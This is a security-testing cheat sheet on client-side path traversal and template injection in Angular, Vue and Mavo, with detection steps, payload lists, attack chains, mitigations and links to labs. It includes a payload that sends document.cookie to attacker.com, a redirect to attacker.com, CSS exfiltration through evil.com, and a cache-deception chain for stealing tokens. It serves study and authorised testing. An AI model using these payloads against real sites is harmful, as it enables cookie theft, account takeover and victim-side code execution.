
## Overview

**Client-Side Path Traversal (CSPT)** occurs when you can manipulate URL paths that the application uses client-side — forcing victims to visit malicious endpoints via JS, CSS, or redirects. This can lead to CSRF, cache poisoning, or credential theft.

**Client-Side Template Injection (CSTI)** is the browser-based cousin of SSTI. Instead of executing code on the server, you inject into client-side JS frameworks (Angular, Vue, Mavo) to execute arbitrary JavaScript in the victim's browser.

---

## Client-Side Path Traversal (CSPT)

### What It Is

- You **control part of a URL path** that gets used in client-side requests
- Application trusts that input and constructs API calls, redirects, or resource loads
- By injecting `../` (dot-segments), you **retarget requests** to different endpoints

### Exploitation Methods

#### ✅ Basic CSPT Detection

1. **Find input that controls paths**: URL params, fragments, DB-injected data
2. **Monitor sinks**: Watch where that data goes (fetch calls, CSS imports, redirects)
3. **Inject traversal**: Try `../../admin/delete` or `../../../v1/token.css`
4. **Observe behavior**: Does the app hit a different endpoint?

**Tools to use:**

- [Eval Villain browser extension](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) — monitors sources & sinks
- [CSPT Playground](https://github.com/doyensec/CSPTPlayground) — practice environment

#### 🔥 CSPT → CSRF

- **Goal**: Turn path manipulation into a state-changing action
- **Steps**:
    1. Find a legit feature that sends authenticated requests (like invite URLs)
    2. Manipulate the path to hit a different endpoint (e.g., `/cancel-card` instead of `/invite`)
    3. Victim clicks your crafted link → CSRF executed
- **Example**: Invite URL becomes `https://site.com/api/../../cancel-card?id=123`

#### 💀 CSPT + Open Redirect → CSS Exfiltration

- **Goal**: Load attacker-controlled CSS via path traversal
- **Steps**:
    1. Find CSS/JS resource loading that uses controllable paths
    2. Inject path traversal: `../../redirect?url=https://evil.com/steal.css`
    3. Combine with open redirect to load external CSS
    4. Exfiltrate data via CSS injection techniques

#### 🎯 CSPT-Assisted Cache Poisoning/Deception

**High impact → Account Takeover**

**How it works:**

1. **Frontend builds API paths** using user input + auth headers
2. **Inject dot-segments** to retarget authenticated requests to different endpoints
3. **Add static suffix** (`.css`, `.js`, `.jpg`) to trick CDN into caching
4. **CDN caches** victim's authenticated response under public cache key
5. **Retrieve cached secret** anonymously → steal tokens/session data

**Step-by-step:**

```
1. Identify SPA code concatenating user input into API paths
2. Find sensitive endpoints (e.g., /v1/user/me)
3. Test static suffixes: /v1/user/me.css, /v1/user/me.json
4. Check CDN headers: Cache-Control: public, X-Cache: Hit
5. Craft URL: https://site.com/profile#/../../../../v1/token.css
6. Victim visits → authenticated fetch hits cacheable path
7. Access same URL anonymously → read cached token → ATO
```

**What to look for:**

- CDN treating JSON as static content when suffixed with `.css/.js`
- Auth headers not included in cache key
- Path parameters concatenated into fetch/XHR calls

---

## Client-Side Template Injection (CSTI)

### What It Is

- **JavaScript frameworks** (Angular, Vue, Mavo) process templates in the browser
- If **user input lands in a template context**, you can inject expressions
- Result: **Arbitrary JavaScript execution** in victim's browser

### Testing for CSTI

**Basic probe:** `{{ 7-7 }}`

- ✅ **Vulnerable:** Renders `0`
- ❌ **Safe:** Renders `{{ 7-7 }}`

---

### AngularJS Exploitation

**Key directive:** `ng-app` — tells Angular to process HTML

#### 🔧 Detection Steps

1. Look for `ng-app` in HTML
2. Find user input reflected in body with `ng-app` scope
3. Inject Angular expression: `{{7-7}}`
4. If it evaluates, you have CSTI

#### 💥 Modern Payloads (Post-1.6)

Angular 1.6+ **removed sandbox** — direct code execution possible:

```javascript
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>
```

**Advanced payload:**

```html
<div ng-app ng-csp>
  <textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//attacker.com/steal'"></textarea>
</div>
```

**Practice environment:**

- [JSFiddle demo](http://jsfiddle.net/2zs2yv7o/)
- [PortSwigger Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

---

### VueJS Exploitation

#### 🔧 Detection Steps

1. Look for Vue.js in page source (`vue.js`, `v-` directives)
2. Find user input in template context
3. Test with: `{{7-7}}`
4. If evaluates, inject constructor payload

#### 💥 Version-Specific Payloads

**Vue 3:**

```javascript
{{_openBlock.constructor('alert(1)')()}}
```

**Vue 2:**

```javascript
{{constructor.constructor('alert(1)')()}}
{{this.constructor.constructor('alert("XSS")')()}}
```

**Advanced payload:**

```html
"><div v-html="''.constructor.constructor('d=document;d.location=`//attacker.com/steal?c=`+document.cookie')()">
</div>
```

**Practice environment:**

- [Vulnerable Vue app](https://vue-client-side-template-injection-example.azu.now.sh/)
- [Working exploit](https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor\(%27alert\(%22foo%22\)%27\)\(\)%7D%7D)

**More payloads:**

- [PortSwigger Vue XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)
- [Evading defenses with Vue gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

---

### Mavo Exploitation

**Mavo** is a JS framework for creating web apps without coding.

#### 🔧 Detection Steps

1. Look for `mv-app` or `mv-` attributes in HTML
2. Find user input in Mavo expression context
3. Test with: `[7*7]`

#### 💥 Top Payloads

```javascript
[(1,alert)(1)]
{{top.alert(1)}}
[self.alert(1)]
[self.alert(1)mod1]
[Omglol mod 1 mod self.alert(1) andlol]
[''=''or self.alert(1)]
```

**Context-specific:**

```html
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('XSS')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
```

**More info:**

- [Abusing JS Frameworks to Bypass XSS](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

---

## Higher Impact Chains

### 🎯 CSPT + Cache Deception → ATO

**Impact:** Full account takeover via cached credentials

**Attack flow:**

```
1. CSPT to retarget authenticated API call
2. Add static suffix to trigger CDN caching
3. Victim visits → their token/session cached publicly
4. Attacker fetches cached response → steals credentials
```

### 🎯 CSTI → Full XSS

**Impact:** Complete client-side compromise

**What you can do:**

- Steal cookies/tokens
- Perform actions as victim
- Exfiltrate sensitive data
- Modify DOM/UI

---

## Mitigations

### For CSPT

- **Validate all path inputs** server-side
- **Normalize paths** before using them (remove `../`)
- **Use allowlists** for valid paths/endpoints
- **Don't trust client-side path construction**
- **CDN cache keys** should include auth headers

### For CSTI

- **Avoid rendering user input in template contexts**
- **Use modern framework versions** with CSP support
- **Implement strict CSP** to block inline scripts
- **Sanitize all user input** before rendering
- **Use framework security features** (Angular's DomSanitizer, Vue's v-text)

---

## Resources & Tools

**CSPT:**

- [Eval Villain Extension](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/)
- [CSPT Playground](https://github.com/doyensec/CSPTPlayground)
- [CSPT Tutorial](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html)
- [CSPT to CSRF](https://blog.doyensec.com/2024/07/02/cspt2csrf.html)

**CSTI:**

- [SSTI Wordlist](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

**Case Studies:**

- [Cache Deception + CSPT → ATO](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT Overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [Client Side Path Manipulation](https://erasec.be/blog/client-side-path-manipulation/)
- [Practical CSPT Attacks](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html)

---

**🎯 Quick Win Strategy:**

1. Search for SPAs using Angular/Vue/Mavo
2. Test `{{7-7}}` in every input
3. Look for path parameters used in fetch calls
4. Check CDN caching behavior on API endpoints
5. Chain findings for maximum impact